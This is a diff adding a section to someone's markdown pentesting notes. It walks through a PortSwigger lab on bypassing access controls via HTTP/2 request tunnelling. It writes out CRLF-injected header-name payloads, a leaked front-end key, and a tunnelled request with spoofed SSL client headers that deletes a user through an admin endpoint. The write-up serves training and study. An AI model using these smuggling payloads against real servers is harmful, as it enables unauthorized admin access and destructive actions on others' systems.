@@ -742,6 +742,86 @@ Open home link in incognito
 We can use burpe search to look for api (PRO version) but saw it in the following 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/9c4cbcec-8fc0-407e-abd4-d395db61aeec)
 
+**Bypassing access controls via HTTP/2 request tunnelling**
+
+Capture http2 request and add the following value to inspector 
+```
+Name 
+foo: bar\r\n
+Host: abc 
+Value 
+xyz
+```
+
+Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names. 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling> 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/1f2f58a8-731e-4a08-8c24-a402bf9e7a2c)
+
+
+
+
+
+
+In browser notice our search are reflected
+/?search=asfasfafs
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/49c86bf8-e7ba-4f2a-b3ee-2d2b270f5a5b)
+
+
+
+
+
+Capture search request and upgrade to http/2
+
+
+Add an arbitrary header and use its name field to inject a large Content-Length header and an additional search parameter as follows: 
+```
+Name 
+foo: bar\r\n
+Content-Length: 500\r\n
+\r\n
+search=x 
+Value 
+xyz
+``` 
+
+From <https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling> 
+
+
+We got our frontend-key
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/65e492f6-88ef-44b7-83cc-9640727a9546)
+
+
+
+
+Change our request method to head , We get a "received only.." cause our content is too big
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/63b87198-2beb-4001-b61e-c6e08bc01099)
+
+
+Change our path to login we get the right amount of content. We can now delete a user. 
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b066cdc9-4530-44ee-bb17-f3dc54b98510)
+
+
+
+To delete a user
+```
+foo: bar
+
+GET /admin/delete?username=carlos HTTP/1.1
+X-SSL-VERIFIED: 1
+X-SSL-CLIENT-CN: administrator
+X-FRONTEND-KEY: 2633746179349812
+
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/5328beda-46d1-4b8d-9bc1-84046208b820)
+
+
+
+Will error out but we deleted the user
+
 
 
 
